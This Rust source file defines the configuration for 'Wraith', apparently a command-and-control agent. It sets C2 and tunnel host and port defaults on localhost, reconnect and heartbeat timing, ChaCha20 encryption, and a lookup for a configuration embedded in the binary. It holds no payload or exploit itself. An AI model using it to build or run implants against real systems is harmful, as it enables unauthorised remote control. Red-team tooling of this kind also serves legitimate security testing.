//! Wraith configuration — plain Rust struct, convertible from embedded config.

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Config {
    /// C2 server address (e.g., "localhost:9000"). Mutually exclusive with tunnel_addr.
    pub c2_addr: Option<String>,
    /// Upstream tunnel server address (e.g., "A:8080"). Mutually exclusive with c2_addr.
    pub tunnel_addr: Option<String>,
    /// Tunnel server host for agent connections.
    pub tunnel_host: String,
    /// Tunnel server port for agent connections.
    pub tunnel_port: u16,
    pub c2_host: String,
    pub c2_port: u16,
    pub reconnect: bool,
    pub reconnect_delay: u64,
    pub heartbeat_interval: u64,
    pub encryption: String,
    pub log_level: String,
    pub tunnel_ip: String,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            c2_addr: None,
            tunnel_addr: None,
            tunnel_host: "127.0.0.1".to_string(),
            tunnel_port: 4446,
            c2_host: "127.0.0.1".to_string(),
            c2_port: 4445,
            reconnect: true,
            reconnect_delay: 5,
            heartbeat_interval: 30,
            encryption: "chacha20".to_string(),
            log_level: "info".to_string(),
            tunnel_ip: "10.8.0.2".to_string(),
        }
    }
}

impl From<crate::wraith::embedded_config::EmbeddedConfig> for Config {
    fn from(ec: crate::wraith::embedded_config::EmbeddedConfig) -> Self {
        Self {
            c2_addr: None,
            tunnel_addr: None,
            tunnel_host: ec.relay_host,
            tunnel_port: ec.relay_port,
            c2_host: ec.c2_host,
            c2_port: ec.c2_port,
            reconnect: ec.reconnect,
            reconnect_delay: ec.reconnect_delay,
            heartbeat_interval: ec.heartbeat_interval,
            encryption: ec.encryption,
            log_level: ec.log_level,
            tunnel_ip: ec.tunnel_ip,
        }
    }
}

impl Config {
    pub fn from_args() -> Self {
        // Command-line args override embedded config which overrides defaults.
        // If embedded config exists, use it as baseline.
        let base = if let Some(ec) = crate::wraith::embedded_config::find_embedded_config() {
            Self::from(ec)
        } else {
            Self::default()
        };

        // CLI overrides are handled in main.rs via clap
        base
    }

    /// Parse a "host:port" address into (host, port)
    pub fn parse_addr(addr: &str) -> (String, u16) {
        if let Some((host, port_str)) = addr.rsplit_once(':') {
            let port = port_str.parse().unwrap_or(4445);
            (host.to_string(), port)
        } else {
            (addr.to_string(), 4445)
        }
    }
}
